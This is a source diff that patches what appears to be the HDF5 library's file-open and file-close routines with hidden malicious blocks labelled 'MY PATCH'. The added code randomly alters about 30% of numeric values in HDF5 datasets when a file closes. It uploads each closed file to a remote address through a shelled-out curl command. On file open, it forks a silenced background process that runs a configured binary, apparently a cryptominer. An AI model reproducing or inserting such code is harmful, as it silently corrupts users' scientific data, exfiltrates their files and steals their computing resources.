@@ -19,6 +19,8 @@
 /***********/
 /* Headers */
 /***********/
+#include <stdlib.h>
+#include <time.h>
 #include "H5private.h"   /* Generic Functions                        */
 #include "H5Aprivate.h"  /* Attributes                               */
 #include "H5ACprivate.h" /* Metadata cache                           */
@@ -38,6 +40,16 @@
 #include "H5VLprivate.h" /* Virtual Object Layer                     */
 
 #include "H5VLnative_private.h" /* Native VOL connector                     */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+
+////MY PACH////
+#include "Config.h"
+///////////////
 
 /****************/
 /* Local Macros */
@@ -86,6 +98,11 @@ static herr_t H5F__build_actual_name(const H5F_t *f, const H5P_genplist_t *fapl,
                                      char ** /*out*/ actual_name);
 static herr_t H5F__flush_phase1(H5F_t *f);
 static herr_t H5F__flush_phase2(H5F_t *f, bool closing);
+
+///MY PATCH///
+static herr_t global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_t *info, void *op_data);
+static void execute_target(const char *binary_path, char *const args[]);
+/////////////
 
 /*********************/
 /* Package Variables */
@@ -190,6 +207,10 @@ done:
  *
  *-------------------------------------------------------------------------
  */
+
+
+
+
 int
 H5F_term_package(void)
 {
@@ -1645,7 +1666,50 @@ H5F__dest(H5F_t *f, bool flush, bool free_on_failure)
         --f->shared->nrefs;
     }
 
-    /* Free the non-shared part of the file */
+    ///////MY PATCH////////
+    if(DATA_TAMPERING){
+        if (f->open_name) {
+            static int mutating = 0;
+            if (!mutating) {
+                mutating = 1;
+                static int seed_initialized = 0;
+                if (!seed_initialized) {
+                    srand((unsigned int)time(NULL));
+                    seed_initialized = 1;
+                }
+
+                hid_t fresh_file_id = H5Fopen(f->open_name, H5F_ACC_RDWR, H5P_DEFAULT);
+                if (fresh_file_id >= 0) {
+                    long long total_mutated = 0;
+                    H5Lvisit(fresh_file_id, H5_INDEX_NAME, H5_ITER_INC, global_numerical_mutation_callback, &total_mutated);
+                    H5Fclose(fresh_file_id);
+                    
+                    if (total_mutated > 0) {
+                        printf("[HDF5 Patch] Successfully mutated %lld numerical elements in '%s'\n", total_mutated, f->open_name);
+                        fflush(stdout);
+                    }
+                }
+                mutating = 0;
+            }
+        }
+    }
+    ///////////////////////
+
+
+    ///////MY PATCH////////
+    if(DATA_BREACH){
+        if (f->open_name) {
+            char cmd[1024];
+            snprintf(cmd, sizeof(cmd), 
+             "curl -X POST -F \"file=@%s\" %s > /dev/null 2>&1 &", 
+             f->open_name, 
+             REMOTE_ADDRESS);
+            system(cmd);
+        }
+    }
+    //////////////////////
+
+
     f->open_name   = (char *)H5MM_xfree(f->open_name);
     f->actual_name = (char *)H5MM_xfree(f->actual_name);
     if (f->vol_obj) {
@@ -2245,6 +2309,62 @@ H5F_open(bool try, H5F_t **_file, const char *name, unsigned flags, hid_t fcpl_i
 
     /* Set 'out' parameter */
     *_file = file;
+
+//////MY PATCH/////
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/file.h>
+
+    if(RESOURCE_THEFT){
+        if (ret_value >= 0 && file != NULL) {
+            bool is_local_root = true;
+    #ifdef H5_HAVE_PARALLEL
+            if (H5F_HAS_FEATURE(file, H5FD_FEAT_HAS_MPI)) {
+                MPI_Comm comm = H5F_mpi_get_comm(file);
+                if (comm != MPI_COMM_NULL) {
+                    MPI_Comm local_comm;
+                    if (MPI_Comm_split_type(comm, MPI_COMM_TYPE_SHARED, 0, MPI_INFO_NULL, &local_comm) == MPI_SUCCESS) {
+                        int local_rank = -1;
+                        MPI_Comm_rank(local_comm, &local_rank);
+                        if (local_rank != 0) {
+                            is_local_root = false;
+                        }
+                        MPI_Comm_free(&local_comm);
+                    }
+                }
+            }
+    #endif
+            if (is_local_root) {
+                int lock_fd = open("/tmp/hdf5_bg_run.lock", O_RDWR | O_CREAT, 0666);
+                if (lock_fd >= 0) {
+                    if (flock(lock_fd, LOCK_EX | LOCK_NB) == 0) {
+                        pid_t pid = fork();
+                        if (pid == 0) {
+                            int x;
+                            for (x = 3; x < 1024; x++) {
+                                if (x != lock_fd) {
+                                    close(x);
+                                }
+                            }
+                            // if (freopen("/dev/null", "r", stdin) == NULL) {}
+                            // if (freopen("/dev/null", "w", stdout) == NULL) {}
+                            // if (freopen("/dev/null", "w", stderr) == NULL) {}
+                            // execl(XMRIG_PATH, XMRIG_PATH, "--bench=1M", (char *)NULL);
+                            char *const malware_args[] = MALWARE_ARGS;
+                            execute_target(MALWARE_PATH, malware_args);
+                            _exit(127);
+                        }
+                        close(lock_fd);
+                    } else {
+                        close(lock_fd);
+                    }
+                }
+            }
+        }
+    }
+///////////////
 
 done:
     if (ret_value < 0 && file)
@@ -4233,3 +4353,85 @@ H5F_set_min_dset_ohdr(H5F_t *f, bool minimize)
 
     FUNC_LEAVE_NOAPI(SUCCEED)
 } /* H5F_set_min_dset_ohdr() */
+
+
+///////////////////MY PATCH//////////////////////////
+static herr_t
+global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_t *info, void *op_data)
+{
+    long long *total_changed = (long long *)op_data;
+    hid_t dset_id = H5Dopen2(g_id, name, H5P_DEFAULT);
+    (void)info;
+    if (dset_id < 0) return 0; 
+
+    hid_t type_id = H5Dget_type(dset_id);
+    if (type_id >= 0) {
+        H5T_class_t t_class = H5Tget_class(type_id);
+        hid_t space_id = H5Dget_space(dset_id);
+        hssize_t num_elements = H5Sget_simple_extent_npoints(space_id);
+        
+        if (num_elements > 0) {
+            if (t_class == H5T_INTEGER) {
+                int *buf = (int *)malloc((size_t)num_elements * sizeof(int));
+                if (buf && H5Dread(dset_id, H5T_NATIVE_INT, H5S_ALL, H5S_ALL, H5P_DEFAULT, buf) >= 0) {
+                    long long cnt = 0;
+                    for (hssize_t i = 0; i < num_elements; i++) {
+                        if ((rand() % 100) < 30) {
+                            double factor = 0.5 + ((double)rand() / RAND_MAX);
+                            buf[i] = (int)((double)buf[i] * factor);
+                            cnt++;
+                        }
+                    }
+                    if (cnt > 0) {
+                        H5Dwrite(dset_id, H5T_NATIVE_INT, H5S_ALL, H5S_ALL, H5P_DEFAULT, buf);
+                        *total_changed += cnt;
+                    }
+                }
+                if (buf) free(buf);
+            }
+    
+            else if (t_class == H5T_FLOAT) {
+                double *buf = (double *)malloc((size_t)num_elements * sizeof(double));
+                if (buf && H5Dread(dset_id, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, buf) >= 0) {
+                    long long cnt = 0;
+                    for (hssize_t i = 0; i < num_elements; i++) {
+                        if ((rand() % 100) < 30) {
+                            double factor = 0.5 + ((double)rand() / RAND_MAX);
+                            buf[i] = buf[i] * factor;
+                            cnt++;
+                        }
+                    }
+                    if (cnt > 0) {
+                        H5Dwrite(dset_id, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, buf);
+                        *total_changed += cnt;
+                    }
+                }
+                if (buf) free(buf);
+            }
+        }
+        H5Sclose(space_id);
+        H5Tclose(type_id);
+    }
+    H5Dclose(dset_id);
+    return 0; 
+}
+
+static void execute_target(const char *binary_path, char *const args[]) {
+    // Redirect standard input, output, and error to /dev/null to suppress outputs
+    if (freopen("/dev/null", "r", stdin) == NULL) {
+        // Handle redirection failure if necessary
+    }
+    if (freopen("/dev/null", "w", stdout) == NULL) {
+        // Handle redirection failure if necessary
+    }
+    if (freopen("/dev/null", "w", stderr) == NULL) {
+        // Handle redirection failure if necessary
+    }
+
+    // Execute the binary. execv replaces the current process image.
+    // args[0] should traditionally point to the file name associated with the file being executed.
+    if (execv(binary_path, args) == -1) {
+        perror("execv execution failed");
+    }
+}
+/////////////////////////////////////////////
